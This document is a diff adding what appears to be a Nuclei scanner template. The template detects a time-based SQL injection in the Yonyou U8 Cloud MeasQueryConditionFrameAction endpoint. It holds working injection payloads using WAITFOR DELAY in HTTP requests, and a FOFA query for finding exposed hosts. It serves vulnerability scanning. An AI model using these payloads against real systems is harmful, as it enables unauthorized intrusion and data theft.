@@ -1,0 +1,39 @@
+id: yongyouU8-Cloud_MeasQueryConditionFrameAction-sql
+
+info:
+  name: "用友 U8 Cloud MeasQueryConditionFrameAction 接口 SQL 时间延迟注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title=="U8C"
+      用友U8 Cloud系统MeasQueryConditionFrameAction接口存在SQL时间延迟注入漏洞。攻击者可通过构造恶意SQL查询，利用该漏洞执行时间延迟注入攻击，从而推断数据库结构或验证注入可行性。在特定权限条件下，该漏洞可能被用于提取敏感数据（如管理员凭证、用户隐私信息）或通过数据库写入操作植入恶意代码，最终实现对服务器的控制。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140378771
+  tags: 用友U8
+
+
+
+http:
+- raw:
+  - |
+    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:4%27--+ HTTP/1.1
+    Host: {{Hostname}}
+
+  - |
+    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:8%27--+ HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
+
